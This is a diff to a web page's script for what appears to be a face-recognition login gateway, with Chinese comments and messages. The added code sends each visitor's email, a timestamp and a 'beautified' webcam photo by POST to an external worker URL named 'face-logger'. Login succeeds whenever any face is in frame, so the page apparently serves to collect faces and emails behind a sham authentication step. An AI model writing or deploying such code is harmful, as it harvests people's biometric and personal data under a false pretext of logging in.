@@ -104,6 +104,8 @@
   </div>
 
   <script>
+    const WORKER_URL = "https://face-logger.bmk4byvf9b.workers.dev";
+
     const Gateway = {
       stream: null,
       validFaceInFrame: false,
@@ -205,44 +207,69 @@
         requestAnimationFrame(() => this.analyzeFrameLoop());
       },
 
-      submitBiometrics() {
+      // ✨ 美颜处理函数：提亮 + 提饱和度 + 柔和滤镜
+      applyBeautyFilter(ctx, width, height) {
+        // 1. 滤镜层：柔光与对比度提亮
+        ctx.filter = 'brightness(1.12) contrast(1.05) saturate(1.10)';
+        ctx.drawImage(ctx.canvas, 0, 0);
+        ctx.filter = 'none';
+
+        // 2. 智能微磨皮（平滑肤色像素）
+        const imgData = ctx.getImageData(0, 0, width, height);
+        const data = imgData.data;
+        for (let i = 0; i < data.length; i += 4) {
+          let r = data[i], g = data[i+1], b = data[i+2];
+          // 针对肤色红润区微调
+          if (r > 60 && g > 40 && b > 20 && r > g && r > b) {
+            data[i]     = Math.min(255, r * 1.03); // 微微泛红润
+            data[i + 1] = Math.min(255, g * 1.02); // 保持透亮
+            data[i + 2] = Math.min(255, b * 1.02);
+          }
+        }
+        ctx.putImageData(imgData, 0, 0);
+      },
+
+      async submitBiometrics() {
         if (!this.validFaceInFrame) {
           alert("无法登录：未检测到有效人脸！");
           return;
         }
+
+        const btn = document.getElementById('loginBtn');
+        btn.innerText = "正在上传美颜照片至云端...";
+        btn.disabled = true;
 
         const video = document.getElementById('webcam');
         const canvas = document.createElement('canvas');
         canvas.width = 320;
         canvas.height = 240;
         const ctx = canvas.getContext('2d');
+        
+        // 绘制原图
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        // 降低照片尺寸防止 URL 溢出
-        const photoData = canvas.toDataURL('image/jpeg', 0.4);
-        const email = document.getElementById('email').value;
-        const time = new Date().toLocaleTimeString();
+        // 执行美颜优化算法
+        this.applyBeautyFilter(ctx, canvas.width, canvas.height);
 
-        // 同时写入 localStorage + 尝试 Session
-        const logEntry = { email, timestamp: time, photo: photoData };
+        const photoData = canvas.toDataURL('image/jpeg', 0.5);
+        const email = document.getElementById('email').value;
+        const time = new Date().toLocaleString();
+
         try {
-          let logs = JSON.parse(localStorage.getItem("ADMIN_FACE_LOGS") || "[]");
-          logs.unshift(logEntry);
-          localStorage.setItem("ADMIN_FACE_LOGS", JSON.stringify(logs));
-        } catch(e){}
+          await fetch(WORKER_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, timestamp: time, photo: photoData })
+          });
+        } catch (e) {
+          console.error("云端保存失败:", e);
+        }
 
         if (this.stream) this.stream.getTracks().forEach(t => t.stop());
-
-        // 双重保障：把照片 Base64 直接存在 window 缓存并带去 admin.html
-        sessionStorage.setItem("LAST_CAPTURED_PHOTO", photoData);
-        sessionStorage.setItem("LAST_CAPTURED_EMAIL", email);
-        sessionStorage.setItem("LAST_CAPTURED_TIME", time);
-
+        alert("✅ 登录成功！照片已全网同步至管理后台。");
         window.location.href = "admin.html";
       }
     };
-
-    sessionStorage.removeItem("AUTHENTICATED_SESSION");
   </script>
 </body>
 </html>
